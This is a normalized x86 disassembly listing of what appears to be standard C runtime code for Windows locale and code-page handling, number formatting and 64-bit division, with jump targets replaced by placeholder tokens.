push [ ebx ]
call sub_428deb
add esp 0xc
test eax eax
jne r-xdata
xor edi edi
push [ ebx ]
call sub_41cd45
pop ecx
cmp eax [ ebx + 0xc ]
jne r-xdata
push esi
call sub_41cd45
inc eax
push eax
push esi
lea eax [ ebx + 0x250 ]
push 0x55
push eax
call sub_419c88
add esp 0x14
test eax eax
jne r-xdata
push esi
call sub_42c589
pop ecx
test eax eax
je r-xdata
or [ ebx + 0x8 ] 0x2
jmp r-xdata
push esi
call sub_42c589
pop ecx
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41f421
int3
or [ ebx + 0x8 ] 0x1
jmp r-xdata
push esi
call sub_41cd45
inc eax
push eax
push esi
lea eax [ ebx + 0x250 ]
push 0x55
push eax
call sub_419c88
add esp 0x14
test eax eax
je r-xdata
push [ ebx ]
call sub_42c1f3
push [ ebx ]
mov esi eax
call sub_41cd45
pop ecx
pop ecx
cmp esi eax
je r-xdata
mov esi [ ebp - 0x88 ]
jmp r-xdata
sub_42c443
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_4246d6
lea esi [ eax + 0x9c ]
push 0x78
mov ecx [ esi + 0x10 ]
neg ecx
sbb ecx ecx
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push edi
call sub_41e86a
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ esi ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_41cd45
inc eax
push eax
push edi
lea eax [ esi + 0x250 ]
push 0x55
push eax
call sub_419c88
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4170bc
leave
retn 0xc
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
or [ esi + 0x8 ] 0x4
sub_42c4f4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
add eax 0x250
push 0x20001004
push eax
call sub_41e86a
add esp 0x10
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_42bfef
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp [ GetACP@IAT ]
push r--data
push esi
call sub_42bfef
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_41832c
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
add eax 0x250
push 0x2000000b
push eax
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
sub_42c589
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push 0x9
lea eax [ ebp - 0x18 ]
push eax
push 0x59
push esi
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4170bc
leave
retn
push 0x9
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_428db5
add esp 0xc
neg eax
sbb eax eax
inc eax
sub_42c5d3
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call sub_4246d6
mov ebx [ ebp + 0x8 ]
lea esi [ eax + 0x9c ]
xor ecx ecx
lea eax [ esi + 0x250 ]
mov [ ebp - 0x4 ] eax
mov [ eax ] cx
lea eax [ ebx + 0x80 ]
lea edi [ esi + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi ] ebx
mov [ edi ] eax
cmp [ eax ] cx
je r-xdata
mov eax [ esi ]
push esi
cmp [ eax ] cx
je r-xdata
push edi
push 0x16
push r--data
call sub_42cdb3
add esp 0xc
xor ecx ecx
call sub_42c0be
mov eax [ edi ]
cmp [ eax ] cx
je r-xdata
xor eax eax
lea eax [ ebx + 0x100 ]
push esi
push eax
call sub_42c4f4
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_42c1a9
call sub_42c135
jmp r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
je r-xdata
push esi
push 0x40
push r--data
call sub_42cdb3
add esp 0xc
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor ecx ecx
push esi
cmp [ eax ] cx
je r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
call sub_42c1a9
jmp r-xdata
call sub_42c135
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop ecx
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
push [ ebp - 0x4 ]
lea ebx [ edi + 0x120 ]
xor eax eax
mov [ ebx ] ax
call sub_41cd45
inc eax
push eax
push [ ebp - 0x4 ]
push 0x55
push ebx
call sub_419c88
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
push 0x40
push edi
push 0x1001
push ebx
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
push 0x40
lea ebx [ edi + 0x80 ]
push ebx
lea eax [ edi + 0x120 ]
push 0x1002
push eax
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
push 0x5f
push ebx
call sub_42dcbe
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x40
push ebx
lea eax [ edi + 0x120 ]
push 0x7
push eax
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
push 0x2e
push ebx
call sub_42dcbe
pop ecx
pop ecx
test eax eax
je r-xdata
push 0xa
push 0x10
lea eax [ edi + 0x100 ]
push eax
push esi
call sub_42dba2
add esp 0x10
sub_42c795
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_4246d6
mov ebx eax
call sub_4246d6
mov edi [ eax + 0x3b8 ]
push esi
call sub_42cc4f
pop ecx
mov ecx [ ebx + 0xb0 ]
neg ecx
sbb ecx ecx
mov esi eax
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0xa0 ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
push esi
call sub_42cd29
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn 0x4
or [ edi ] 0x4
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] esi
sub_42c843
push ebp
mov ebp esp
push esi
call sub_4246d6
mov esi eax
push [ esi + 0xa0 ]
call sub_41cd45
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_42c795
mov [ esi + 0xb0 ] eax
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
test [ eax ] 0x4
jne r-xdata
pop ebp
retn
and [ eax ] 0x0
sub_42c883
push ebp
mov ebp esp
push esi
push edi
call sub_4246d6
lea esi [ eax + 0x9c ]
push [ esi ]
call sub_41cd45
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_41cd45
mov edi [ ebp + 0x8 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x14 ] eax
and [ edi + 0x4 ] 0x0
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
je r-xdata
push [ esi ]
call sub_42c959
pop ecx
push 0x2
pop eax
jmp r-xdata
and [ edi ] 0x0
test [ edi ] 0x200
je r-xdata
push 0x1
push sub_42c983
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesW@IAT ]
test [ edi ] 0x100
je r-xdata
test [ edi ] 0x7
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_42c900
push ebp
mov ebp esp
push esi
call sub_4246d6
mov esi eax
push [ esi + 0x9c ]
call sub_41cd45
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0xac ] eax
je r-xdata
push [ esi + 0x9c ]
call sub_42c959
pop ecx
push 0x2
pop eax
jmp r-xdata
pop ebp
retn
and [ eax ] 0x0
push 0x1
push sub_42cb76
mov [ esi + 0xa8 ] eax
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
test [ eax ] 0x4
jne r-xdata
sub_42c959
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
sub_42c983
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_4246d6
lea ebx [ eax + 0x9c ]
call sub_4246d6
mov edi [ eax + 0x3b8 ]
push esi
call sub_42cc4f
pop ecx
mov ecx [ ebx + 0x14 ]
neg ecx
sbb ecx ecx
mov esi eax
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x4 ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ edi ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0xf0
lea eax [ ebp - 0xf4 ]
push eax
mov eax [ ebx + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ ebx + 0x10 ]
neg ecx
sbb ecx ecx
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
test [ edi ] 0x2
jne r-xdata
or [ edi ] 0x304
mov [ edi + 0x4 ] esi
jmp r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
or [ edi ] 0x200
cmp [ ebx + 0x10 ] eax
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov [ edi + 0x8 ] esi
cmp [ ebx + 0xc ] 0x0
je r-xdata
or [ edi ] 0x100
cmp [ edi + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] eax
je r-xdata
mov edx [ edi ]
test dl 0x1
jne r-xdata
push [ ebx + 0xc ]
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_428deb
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ edi + 0x4 ] esi
push [ ebx ]
call sub_41cd45
pop ecx
cmp eax [ ebx + 0xc ]
jne r-xdata
push esi
call sub_42cd29
pop ecx
test eax eax
je r-xdata
or [ edi ] 0x2
mov [ edi + 0x8 ] esi
push [ ebx ]
call sub_41cd45
pop ecx
cmp eax [ ebx + 0xc ]
jne r-xdata
push edi
push eax
push edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ edi ] edx
mov [ edi + 0x4 ] esi
jmp r-xdata
push esi
call sub_42cd4b
add esp 0xc
test eax eax
je r-xdata
sub_42cb76
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_4246d6
lea ebx [ eax + 0x9c ]
call sub_4246d6
mov edi [ eax + 0x3b8 ]
push esi
call sub_42cc4f
pop ecx
mov ecx [ ebx + 0x10 ]
neg ecx
sbb ecx ecx
mov esi eax
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
or [ edi ] 0x4
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
push edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_42cd4b
add esp 0xc
test eax eax
je r-xdata
push edi
push eax
sub_42cc4f
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
movzx ecx [ edx ]
xor esi esi
test cx cx
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
push 0x5
pop edi
lea eax [ ecx - 0x41 ]
cmp ax di
ja r-xdata
add ecx 0xffd9
jmp r-xdata
movzx ecx cx
add ecx 0xffffffd0
shl esi 0x4
add esi ecx
movzx ecx [ edx ]
test cx cx
jne r-xdata
add ecx 0xfff9
lea eax [ ecx - 0x61 ]
lea edx [ edx + 0x2 ]
cmp ax di
ja r-xdata
pop edi
sub_42cc9e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_42bfef
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp [ GetACP@IAT ]
push r--data
push esi
call sub_42bfef
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_41832c
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
sub_42cd29
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_42cd4b
push ebp
mov ebp esp
push ecx
push esi
push edi
call sub_4246d6
mov esi [ ebp + 0x8 ]
push 0x2
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
and ecx 0x3ff
push 0x20000001
or ecx 0x400
push ecx
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
leave
retn
push [ edi + 0x9c ]
call sub_42c959
push [ edi + 0x9c ]
mov esi eax
call sub_41cd45
pop ecx
pop ecx
cmp esi eax
je r-xdata
sub_42cdb3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
xor edx edx
push edi
inc edx
xor edi edi
test esi esi
js r-xdata
xor eax eax
test edx edx
pop edi
sete al
pop esi
pop ebp
retn
push ebx
pop ebx
mov ecx [ ebp + 0x8 ]
lea eax [ edi + esi ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
mov eax ebx
imul eax eax 0xc
mov [ ebp + 0xc ] eax
push [ eax + ecx ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_419a78
mov edx eax
pop ecx
pop ecx
test edx edx
jne r-xdata
jns r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
add eax 0x4
add ecx eax
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
jmp r-xdata
lea edi [ ebx + 0x1 ]
lea esi [ ebx - 0x1 ]
jmp r-xdata
cmp edi esi
jle r-xdata
test edx edx
je r-xdata
sub_42ce1f
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov [ ebp - 0x14 ] eax
call sub_4246d6
lea ebx [ eax + 0x9c ]
xor eax eax
push 0xc
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41cae0
add esp 0xc
call sub_4246d6
lea ecx [ ebp - 0x10 ]
mov [ eax + 0x3b8 ] ecx
test esi esi
jne r-xdata
lea eax [ esi + 0x80 ]
lea edi [ ebx + 0x4 ]
xor ecx ecx
mov [ ebx ] esi
mov [ edi ] eax
test eax eax
je r-xdata
or [ ebp - 0x10 ] 0x104
jmp r-xdata
mov [ ebp - 0x10 ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax ] cx
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ eax ] cx
je r-xdata
mov eax [ r--data ]
push edi
dec eax
push eax
push r--data
call sub_42cdb3
add esp 0xc
xor ecx ecx
xor eax eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ esi + 0x100 ]
neg esi
sbb esi esi
and esi eax
push esi
call sub_42cc9e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
mov [ ebp - 0x10 ] 0x104
cmp [ eax ] cx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_42c843
lea eax [ ebp - 0x10 ]
push eax
call sub_42c900
cmp [ eax ] cx
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ r--data ]
push ebx
dec eax
push eax
push r--data
call sub_42cdb3
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_42c883
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop ecx
jne r-xdata
push 0x1
push [ ebp - 0xc ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_42c900
jmp r-xdata
xor ecx ecx
cmp [ eax ] cx
je r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
pop ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_42c883
jmp r-xdata
push 0x55
lea eax [ ebx + 0x250 ]
push eax
push [ ebp - 0xc ]
call sub_41e773
mov ebx [ ebp - 0x14 ]
add esp 0xc
test ebx ebx
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
push 0x55
lea eax [ ebx + 0x120 ]
push eax
push [ ebp - 0xc ]
call sub_41e773
mov edi [ GetLocaleInfoW@IAT ]
add esp 0xc
push 0x40
push ebx
push 0x1001
push [ ebp - 0xc ]
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
push 0x40
lea eax [ ebx + 0x80 ]
push eax
push 0x1002
push [ ebp - 0x8 ]
call edi
test eax eax
je r-xdata
push 0xa
push 0x10
lea ecx [ ebx + 0x100 ]
push ecx
push esi
call sub_42dba2
add esp 0x10
sub_42d03c
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ edx + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_41ccf1
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ esi ] 0x0
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
push ebx
lea ebx [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax ebx
test ecx ecx
jle r-xdata
call sub_41ccf1
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov dl [ edi ]
test dl dl
je r-xdata
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc edi
jmp r-xdata
push ebx
call sub_41a7f0
inc eax
push eax
push ebx
push esi
call sub_4170d0
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ eax ] dl
inc eax
dec ecx
test ecx ecx
jg r-xdata
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_42d0ec
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
call sub_4199d2
lea eax [ ebp - 0x28 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42e84c
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_42dd6c
mov ecx eax
mov eax [ ebp - 0x14 ]
add esp 0x28
test al 0x3
jne r-xdata
test al 0x1
jne r-xdata
cmp ecx 0x1
je r-xdata
push 0x4
jmp r-xdata
test al 0x2
je r-xdata
push 0x3
cmp ecx 0x2
jne r-xdata
pop ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42d178
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
call sub_4199d2
lea eax [ ebp - 0x28 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42e84c
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_42e2dc
mov ecx eax
mov eax [ ebp - 0x14 ]
add esp 0x28
test al 0x3
jne r-xdata
test al 0x1
jne r-xdata
cmp ecx 0x1
je r-xdata
push 0x4
jmp r-xdata
test al 0x2
je r-xdata
push 0x3
cmp ecx 0x2
jne r-xdata
pop ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42d204
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov edx [ eax + 0x4 ]
push esi
push edi
movzx edi [ eax + 0x6 ]
mov eax [ eax ]
mov ecx edi
shr ecx 0x4
and ecx 0x7ff
and edi 0x8000
mov esi ecx
and edx 0xfffff
mov ebx 0x80000000
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
test edx edx
jne r-xdata
cmp esi 0x7ff
je r-xdata
lea eax [ ecx + 0x3c01 ]
xor ebx ebx
test eax eax
jne r-xdata
mov eax 0x7fff
jmp r-xdata
lea eax [ ecx + 0x3c00 ]
jmp r-xdata
or edi eax
mov [ ebx + 0x8 ] di
mov edi eax
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] edx
and [ eax ] edx
mov [ eax + 0x8 ] di
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov esi ecx
shr esi 0x15
shl edx 0xb
or esi edx
or esi ebx
mov ebx [ ebp + 0x8 ]
shl ecx 0xb
mov [ ebp + 0xc ] eax
mov [ ebx + 0x4 ] esi
mov [ ebx ] ecx
test esi esi
js r-xdata
movzx eax ax
mov edx [ ebx ]
mov ecx edx
shr ecx 0x1f
add esi esi
lea eax [ edx + edx ]
add edi 0xffff
or esi ecx
mov [ ebx ] eax
jns r-xdata
mov [ ebp + 0xc ] edi
mov edi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] esi
pop edi
pop esi
pop ebx
leave
retn
sub_42d2ca
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_42d204
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_42efc8
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_423cea
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
sub_42d360
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
